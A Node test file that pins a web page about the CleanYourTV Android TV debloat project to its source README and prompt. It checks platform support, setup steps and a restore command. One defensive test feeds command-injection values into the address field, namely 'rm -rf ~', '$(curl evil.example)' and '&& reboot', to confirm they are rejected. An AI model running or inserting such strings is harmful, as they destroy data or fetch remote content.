// Run: npm test  (node --test; Node strips the types from data.ts, so no test runner is installed)
// These pin the page's facts to the source repo (README.md, PROMPT.md and tools/restore.sh of
// github.com/Gathin23/cleanyourtv at commit f63a1eb, read 2026-11-22) and to the wiring in src/lib/free.ts.
import assert from "node:assert/strict";
import { test } from "node:test";
import {
  CLONE,
  COVERAGE,
  GOOGLE_TV_STOCK,
  HOME_AFTER,
  HOME_BEFORE,
  HOW_IT_WORKS,
  MODEL_SLOT,
  NEEDS,
  PLATFORMS,
  PROMPT_OPENING,
  QUICK_START,
  REPO,
  RESTORE_FACTS,
  RESTORE_HOST,
  SWITCH,
  TOP_BRANDS,
  TV_KINDS,
  hostOrDefault,
  platformFor,
  restoreLine,
} from "./data.ts";
import { getDrop, getDropByNumber, getDrops } from "../../../lib/free.ts";

test("every link goes to the original repo, not one of its forks", () => {
  assert.equal(REPO, "https://github.com/Gathin23/cleanyourtv");
  assert.equal(CLONE, "git clone https://github.com/Gathin23/cleanyourtv");
});

test("the coverage is the README's: 504 TV models from 138 brands", () => {
  assert.deepEqual(COVERAGE, { models: 504, brands: 138 });
});

test("the brands with the most lists, in the README's order", () => {
  assert.deepEqual(
    TOP_BRANDS.map((b) => [b.name, b.lists]),
    [
      ["TCL", 89],
      ["Sony", 53],
      ["Xiaomi", 46],
      ["Philips", 25],
      ["Skyworth", 18],
      ["Hisense", 17],
    ],
  );
});

test("the four rows of Supported TVs, with the README's own words", () => {
  assert.deepEqual(
    PLATFORMS.map((p) => [p.id, p.debloat, p.launcher, p.says]),
    [
      ["android", true, true, "The debloat and the launcher."],
      [
        "fire",
        true,
        false,
        "The debloat half only, since Fire OS will not hand Home to a third-party launcher. And on the 2015 Fire TV Box (Fire OS 5) even that half fails: every pm route is refused.",
      ],
      ["tcl-china", true, false, "They refuse to install any launcher at all; their lists say so in the header."],
      ["other", false, false, "Not supported (no ADB)."],
    ],
  );
});

test("picking a platform returns its row; an unknown one returns nothing", () => {
  assert.equal(platformFor("android")?.verdict, "Works");
  assert.equal(platformFor("other")?.verdict, "Not supported");
  assert.equal(platformFor("apple-tv"), undefined);
});

test("the TV you cannot clean is sent to the README's own page for it", () => {
  assert.equal(platformFor("other")?.instead, "https://cleanyour.tv/not-android");
  assert.equal(platformFor("android")?.instead, undefined);
});

test("what to switch on first: the README's path, seven presses on Build, then USB debugging", () => {
  assert.deepEqual(SWITCH.path, ["Settings", "Device Preferences", "About"]);
  assert.equal(SWITCH.row, "Build");
  assert.equal(SWITCH.presses, 7);
  assert.equal(SWITCH.menu, "Developer options");
  assert.equal(SWITCH.toggle, "USB debugging");
});

test("what the computer needs, as the README lists it", () => {
  assert.deepEqual(NEEDS, [
    "the same Wi-Fi as the TV",
    "a shell",
    "Python 3",
    "a JDK from 17 through 22",
    "Android SDK platform 34 with build-tools 34",
  ]);
});

test("the three steps are the README's Quick start rows, word for word", () => {
  assert.deepEqual(
    QUICK_START.map((s) => [s.where, s.what]),
    [
      [
        "On the TV",
        "Settings → Device Preferences → About → press OK on Build seven times → back → Developer options → USB debugging on. If you see a Network or ADB debugging toggle, turn that on too. Keep the TV on.",
      ],
      [
        "On your computer",
        "Clone the repo and open that folder in your assistant (git clone https://github.com/Gathin23/cleanyourtv), then paste PROMPT.md and fill in your TV model.",
      ],
      [
        "Follow along",
        "Accept \"Allow USB debugging?\" on the TV, then answer the checklist: which apps you use, the dock size and app order, whether to keep the voice assistant, Chromecast and updates.",
      ],
    ],
  );
});

test("the prompt's first paragraph is PROMPT.md's, with the slot for the model", () => {
  assert.equal(
    PROMPT_OPENING,
    "I want to debloat my Android TV and replace its launcher with a clean Apple TV style home screen. My TV model is: <MODEL NAME HERE>. Work on the real device, step by step, and verify everything you do with screenshots pulled from the TV. Ask me before anything that depends on my preferences.",
  );
  assert.equal(MODEL_SLOT, "<MODEL NAME HERE>");
});

test("the slot appears once, so the figure can put the typed model in its place", () => {
  assert.equal(PROMPT_OPENING.split(MODEL_SLOT).length, 2);
});

test("Fire TV: the page also shows PROMPT.md's stricter line", () => {
  assert.equal(platformFor("fire")?.promptSays, "It will not work on Samsung Tizen, LG webOS or Fire TV.");
});

test("/free/74 opens the CleanYourTV page with the reel's keyword", () => {
  const drop = getDropByNumber("74");
  assert.equal(drop?.slug, "74-clean-your-tv");
  assert.equal(drop?.keyword, "TV");
  assert.ok(getDrops().some((d) => d.number === 74));
});

test("the page's button goes to the original repo", () => {
  assert.deepEqual(getDrop("74-clean-your-tv")?.tools.map((t) => t.href), [REPO]);
});

test("one figure per chapter, in order", () => {
  const chapters = getDrop("74-clean-your-tv")?.about?.chapters ?? [];
  assert.deepEqual(chapters.map((c) => c.tv), [...TV_KINDS]);
  assert.deepEqual([...TV_KINDS], ["check", "switch", "steps", "home", "restore"]);
});

test("the page does not call an October repo new, and names no private path or company", () => {
  const text = JSON.stringify(getDrop("74-clean-your-tv"));
  assert.equal(/just released|right now|this week|trending now|brand new/i.test(text), false);
  assert.equal(/\/Users\/|Obsidian|\btps\b|tetty/i.test(text), false);
});

test("how it works: back up, disable, install, in that order", () => {
  assert.deepEqual(
    HOW_IT_WORKS.map((s) => s.step),
    ["Back up", "Disable", "Install"],
  );
  assert.equal(HOW_IT_WORKS[0].what, "The list of installed packages and settings.");
});

test("the one-line restore is the README's line for Android TV", () => {
  assert.equal(restoreLine("android"), "TV_HOST=192.168.1.50 tools/restore.sh examples/<your tv>/debloat.txt");
});

test("on Google TV the restore line also names the stock launcher", () => {
  assert.equal(GOOGLE_TV_STOCK, "com.google.android.apps.tv.launcherx");
  assert.equal(
    restoreLine("google"),
    "TV_HOST=192.168.1.50 tools/restore.sh examples/<your tv>/debloat.txt com.google.android.apps.tv.launcherx",
  );
});

test("your TV's address goes into the restore line", () => {
  assert.equal(restoreLine("android", "192.168.0.23"), "TV_HOST=192.168.0.23 tools/restore.sh examples/<your tv>/debloat.txt");
});

test("only an IPv4 address is accepted; anything else falls back to the README's example", () => {
  assert.equal(RESTORE_HOST, "192.168.1.50");
  assert.equal(hostOrDefault("10.0.0.7"), "10.0.0.7");
  assert.equal(hostOrDefault(" 10.0.0.7 "), "10.0.0.7");
  assert.equal(hostOrDefault(""), RESTORE_HOST);
  assert.equal(hostOrDefault("192.168.1"), RESTORE_HOST);
  assert.equal(hostOrDefault("999.1.1.1"), RESTORE_HOST);
  assert.equal(hostOrDefault("1.2.3.4; rm -rf ~"), RESTORE_HOST);
  assert.equal(hostOrDefault("$(curl evil.example)"), RESTORE_HOST);
});

test("a line built from a bad address is still the README's line, so nothing typed can add a command", () => {
  assert.equal(restoreLine("android", "1.2.3.4 && reboot"), restoreLine("android"));
});

test("the four facts about restoring, from the README's table", () => {
  assert.deepEqual(
    RESTORE_FACTS.map((f) => f.what),
    ["A record comes first", "Restore replays it", "The launcher stays installed", "No computer?"],
  );
  assert.equal(RESTORE_FACTS[2].how, "Remove it from the TV's Settings → Apps if you want it gone.");
});

test("every mark on the two photos stays inside the photo", () => {
  for (const mark of [...HOME_BEFORE.marks, ...HOME_AFTER.marks]) {
    const [x, y, w, h] = mark.box;
    assert.ok(x >= 0 && y >= 0 && w > 0 && h > 0, mark.id);
    assert.ok(x + w <= 100 && y + h <= 100, mark.id);
    assert.ok(mark.label.length > 0 && mark.says.length > 0, mark.id);
  }
  assert.equal(new Set([...HOME_BEFORE.marks, ...HOME_AFTER.marks].map((m) => m.id)).size, HOME_BEFORE.marks.length + HOME_AFTER.marks.length);
});
